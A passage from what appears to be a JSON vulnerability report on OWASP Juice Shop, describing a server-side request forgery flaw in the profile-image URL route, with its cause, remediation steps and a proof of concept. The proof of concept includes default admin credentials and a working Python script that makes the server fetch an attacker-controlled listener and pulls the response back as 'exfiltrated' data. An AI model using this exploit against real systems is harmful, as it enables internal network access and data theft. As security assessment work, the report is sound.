              "method": "POST",
              "cwe": "CWE-918",
              "impact": "Successful exploitation enables an authenticated attacker to:\n\n- Make arbitrary HTTP requests from the application server to any network-reachable host (internal services, other microservices, databases with HTTP interfaces, admin panels)\n- Exfiltrate response data from internal services by retrieving the saved profile image file, which contains the raw response body\n- Perform internal network reconnaissance and port scanning by observing response timing and error behavior\n- Access services bound exclusively to the loopback interface (127.0.0.1) or internal network ranges\n- Potentially pivot to additional services in the same network segment\n\nIn cloud-hosted deployments, this class of vulnerability can lead to credential theft via instance metadata services, though such targets were out of scope for this assessment.",
              "technical_analysis": "The vulnerability exists in `routes/profileImageUrlUpload.ts`. The handler extracts `req.body.imageUrl` and passes it directly to `fetch()` on line 24 without any destination validation:\n\n```typescript\nconst url = req.body.imageUrl\nconst response = await fetch(url)\n```\n\nNo allowlist, denylist, IP range blocking, DNS resolution validation, or redirect-following restrictions are implemented. The only prerequisite is authentication via a valid session cookie (`req.cookies.token`).\n\nWhen the fetch succeeds (HTTP 200 with a body), the response stream is piped to a file in the uploads directory and the user's profile image record is updated to the local path. The saved file is then publicly accessible at `/assets/public/images/uploads/{userId}.{ext}`.\n\nWhen the fetch fails or stream processing errors, the catch handler (line 33-41) stores the raw URL string directly in the database as the profile image value.\n\nRoot cause: Complete absence of server-side URL validation before performing outbound HTTP requests with user-controlled destinations.",
              "remediation_steps": "1. Implement a strict URL allowlist that permits only approved external domains for profile image fetching. Reject all other destinations by default.\n\n2. After DNS resolution, validate the resolved IP address against blocked ranges before initiating the connection. Block all private (RFC 1918), loopback (127.0.0.0/8), and link-local (169.254.0.0/16) address ranges for both IPv4 and IPv6.\n\n3. Re-validate the destination address on every HTTP redirect hop. Do not follow redirects to disallowed destinations.\n\n4. Enforce response content-type validation. Only accept responses with recognized image MIME types (image/jpeg, image/png, image/gif, image/svg+xml) and reject all other content types before writing to disk.\n\n5. Apply response size limits to prevent abuse as a proxy for large data transfers.\n\n6. Consider using a dedicated egress proxy for outbound image fetches that enforces network policy and provides audit logging.",
              "poc": {
                "description": "To reproduce the vulnerability:\n\n1. Authenticate to the application as any user (e.g., admin@juice-sh.op with password admin123) and obtain the session token cookie.\n\n2. Send a POST request to /profile/image/url with imageUrl pointing to an attacker-controlled or internal host:\n   ```\n   POST /profile/image/url\n   Cookie: token=<jwt_token>\n   Content-Type: application/x-www-form-urlencoded\n\n   imageUrl=http://<attacker_listener>:9996/sensitive-data.jpg\n   ```\n\n3. Observe the inbound request on the listener arriving from the application server with User-Agent \"node\", confirming server-side fetch.\n\n4. Retrieve the saved response body by accessing the user's profile image at /assets/public/images/uploads/{userId}.jpg — the file contains the raw response body from the SSRF target, regardless of content type.\n\n5. For internal service access, substitute the imageUrl with any internal endpoint (e.g., http://127.0.0.1:3002/rest/admin/application-configuration or any other internal service).",
                "script": "import json\nimport threading\nimport http.server\nimport time\n\nimport requests\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Step 1: Authenticate\nlogin_resp = requests.post(\n    f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"admin@juice-sh.op\", \"password\": \"admin123\"},\n)\ntoken = login_resp.json()[\"authentication\"][\"token\"]\nprint(f\"[+] Authenticated, token: {token[:40]}...\")\n\n\n# Step 2: Start a listener to prove server-side fetch\nclass SSRFListener(http.server.BaseHTTPRequestHandler):\n    received = []\n\n    def do_GET(self):\n        self.received.append(\n            {\"path\": self.path, \"client\": self.client_address, \"headers\": dict(self.headers)}\n        )\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"image/jpeg\")\n        self.end_headers()\n        # Simulate sensitive internal data in response\n        self.wfile.write(b'{\"secret\":\"SSRF_DATA_EXFILTRATED\",\"internal\":true}')\n\n    def log_message(self, *a):\n        pass\n\n\nserver = http.server.HTTPServer((\"0.0.0.0\", 9996), SSRFListener)\nthreading.Thread(target=server.serve_forever, daemon=True).start()\nprint(\"[+] SSRF proof listener started on port 9996\")\n\n# Step 3: Trigger SSRF\nLISTENER_IP = \"172.17.0.8\"  # Container IP reachable from the app server\nssrf_url = f\"http://{LISTENER_IP}:9996/internal-secrets.jpg\"\n\nresp = requests.post(\n    f\"{BASE_URL}/profile/image/url\",\n    cookies={\"token\": token},\n    data={\"imageUrl\": ssrf_url},\n)\nprint(f\"[+] SSRF request sent, status: {resp.status_code}\")\ntime.sleep(2)\n\n# Step 4: Verify server-side request was received\nprint(f\"[+] Requests received by listener: {len(SSRFListener.received)}\")\nfor r in SSRFListener.received:\n    print(f\"    Path: {r['path']}\")\n    print(f\"    Client IP: {r['client'][0]} (app server, NOT our IP)\")\n    print(f\"    User-Agent: {r['headers'].get('user-agent', 'N/A')}\")\n\n# Step 5: Retrieve exfiltrated data from saved profile image\nprofile_resp = requests.get(\n    f\"{BASE_URL}/api/Users/1\",\n    headers={\"Authorization\": f\"Bearer {token}\"},\n    cookies={\"token\": token},\n)\nprofile_image_path = profile_resp.json()[\"data\"][\"profileImage\"]\nprint(f\"[+] Profile image path: {profile_image_path}\")\n\nif profile_image_path.startswith(\"/\"):\n    exfil_resp = requests.get(f\"{BASE_URL}{profile_image_path}\")\n    print(f\"[+] Exfiltrated data from saved file: {exfil_resp.text}\")\n\nserver.shutdown()\nprint(\"[+] SSRF vulnerability confirmed - server-side fetch with data exfiltration\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-862",
          "level": "error",
          "message": {
            "text": "Broken Function-Level Authorization Allows Non-Admin Product Modification"
